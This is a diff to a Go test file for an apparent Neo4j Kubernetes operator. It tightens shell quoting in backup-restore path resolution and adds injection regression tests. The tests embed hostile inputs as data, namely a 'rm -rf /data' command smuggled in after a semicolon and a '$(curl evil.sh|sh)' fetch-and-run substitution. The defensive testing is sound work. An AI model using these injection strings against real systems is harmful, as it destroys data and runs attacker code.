@@ -498,9 +498,10 @@ func TestBuildLocalRestoreFilePath_PVCResolvesToShellSubst(t *testing.T) {
 	}
 	got := buildLocalRestoreFilePath(restore, "/backup/roundtrip-backup-backup")
 	assert.Equal(t,
-		"$(ls /backup/roundtrip-backup-backup/'neo4j'-*.backup | head -1)",
+		"$(ls '/backup/roundtrip-backup-backup'/'neo4j'-*.backup | head -1)",
 		got,
-		"PVC restore must resolve --from-path via shell $() so neo4j-admin gets a file path, not a directory")
+		"PVC restore must resolve --from-path via shell $() so neo4j-admin gets a file path, "+
+			"not a directory; both backup-path and dbname are single-quoted to prevent injection")
 }
 
 // TestBuildLocalRestoreFilePath_NilStorageDefaultsToPVC: when Source.Storage
@@ -521,7 +522,7 @@ func TestBuildLocalRestoreFilePath_NilStorageDefaultsToPVC(t *testing.T) {
 	}
 	got := buildLocalRestoreFilePath(restore, "/backup/some-backup")
 	assert.NotEmpty(t, got, "nil Storage must still trigger resolution — defaulted to PVC")
-	assert.Contains(t, got, "$(ls /backup/some-backup/'neo4j'-*.backup")
+	assert.Contains(t, got, "$(ls '/backup/some-backup'/'neo4j'-*.backup")
 }
 
 // TestBuildLocalRestoreFilePath_CloudSkipsResolution: cloud URIs (s3://,
@@ -580,12 +581,66 @@ func TestBuildLocalRestoreFilePath_ShellInjectionGuard(t *testing.T) {
 // resolution used by buildPITRRestoreCommand (which doesn't have a direct
 // `Source.Storage` to inspect since the source is resolved through
 // `BaseBackup`). The string `/backup` prefix is the canonical signal that
-// the path is a local mount.
+// the path is a local mount. Both the path AND the database name are
+// shell-quoted to prevent injection via spec.source.backupPath.
 func TestResolveLocalPVCFromPath_PVCPathGlobbed(t *testing.T) {
 	got := resolveLocalPVCFromPath("/backup/daily-backup-cron-1738000000", "neo4j")
 	assert.Equal(t,
-		"$(ls /backup/daily-backup-cron-1738000000/'neo4j'-*.backup | head -1)",
+		"$(ls '/backup/daily-backup-cron-1738000000'/'neo4j'-*.backup | head -1)",
 		got)
+}
+
+// TestResolveLocalPVCFromPath_BackupPathShellInjectionGuard locks in the
+// quoting fix for the CVE-class issue where spec.source.backupPath flowed
+// unquoted into the shell substitution. Without quoting, a backupPath
+// like `foo; rm -rf /data #` produced:
+//
+//	$(ls /backup/foo; rm -rf /data #/'neo4j'-*.backup | head -1)
+//
+// — the `;` terminates the `ls` and `rm -rf /data` executes inside the
+// restore Pod, which mounts /data as ReadWrite (server-0's database PVC)
+// and carries NEO4J_ADMIN_PASSWORD in its env. With quoting, the whole
+// hostile string becomes a single literal argument to ls.
+func TestResolveLocalPVCFromPath_BackupPathShellInjectionGuard(t *testing.T) {
+	got := resolveLocalPVCFromPath("/backup/foo; rm -rf /data #", "neo4j")
+	// The single-quoted form makes the entire `/backup/foo; rm -rf /data #`
+	// a single shell token; the `;` is literal, not a command separator.
+	assert.Contains(t, got, "'/backup/foo; rm -rf /data #'",
+		"backupPath must be single-quoted as a single shell token")
+	// Pin the exact output to catch any future refactor that drops the
+	// quote on either input (backupPath OR dbname). The substitution
+	// body when parsed by /bin/sh is:
+	//   ls '/backup/foo; rm -rf /data #'/'neo4j'-*.backup | head -1
+	// which after quote removal is a single literal path argument to
+	// `ls` — no command separator, no injection.
+	assert.Equal(t,
+		"$(ls '/backup/foo; rm -rf /data #'/'neo4j'-*.backup | head -1)",
+		got,
+		"output must match the expected fully-quoted form exactly")
+}
+
+// TestResolveLocalPVCFromPath_NestedCommandSubstitutionGuard: a backupPath
+// like `$(curl evil.sh|sh)` would, without quoting, be interpreted as a
+// nested command substitution. Single-quoting prevents the `$(` from
+// being parsed as a substitution opening.
+func TestResolveLocalPVCFromPath_NestedCommandSubstitutionGuard(t *testing.T) {
+	got := resolveLocalPVCFromPath("/backup/$(curl evil.sh|sh)", "neo4j")
+	// Single-quoted: the `$(` is literal, not a substitution opener.
+	assert.Contains(t, got, "'/backup/$(curl evil.sh|sh)'",
+		"backupPath containing nested $() must be single-quoted so it's literal")
+}
+
+// TestResolveLocalPVCFromPath_EmbeddedSingleQuoteGuard: shellQuote handles
+// embedded single quotes via the `'\”` idiom. This test verifies that
+// even an adversarial input with `'` characters is correctly escaped.
+func TestResolveLocalPVCFromPath_EmbeddedSingleQuoteGuard(t *testing.T) {
+	got := resolveLocalPVCFromPath("/backup/foo'bar", "neo4j")
+	// shellQuote produces 'foo'\''bar' for input foo'bar — the embedded
+	// single quote is escaped via close-quote, backslash-quote, open-quote.
+	// After shell quote removal the literal string is `/backup/foo'bar`,
+	// which is a (very unusual but valid) Unix filename.
+	assert.Contains(t, got, `'/backup/foo'\''bar'`,
+		"embedded single quotes must use the close-escape-open idiom from shellQuote")
 }
 
 // TestResolveLocalPVCFromPath_CloudUnchanged: cloud URIs must NOT be
@@ -670,8 +725,10 @@ func TestBuildPITRRestoreCommand_PVCBaseBackupAppliesFixups(t *testing.T) {
 	cmd, err := r.buildPITRRestoreCommand(context.Background(), restore, cluster)
 	require.NoError(t, err)
 
-	// Shell-substitution form for --from-path (FILE, not directory)
-	assert.Contains(t, cmd, "--from-path=$(ls /backup/daily-backup-cron-1738000000/'neo4j'-*.backup | head -1)",
+	// Shell-substitution form for --from-path (FILE, not directory).
+	// Both backup-path and dbname are single-quoted to prevent shell
+	// injection via spec.source.backupPath.
+	assert.Contains(t, cmd, "--from-path=$(ls '/backup/daily-backup-cron-1738000000'/'neo4j'-*.backup | head -1)",
 		"PITR PVC path must use shell substitution to resolve to a single .backup file")
 	// Prelude that creates the empty temp dir
 	assert.Contains(t, cmd, "rm -rf /tmp/restore-tmp && mkdir -p /tmp/restore-tmp",
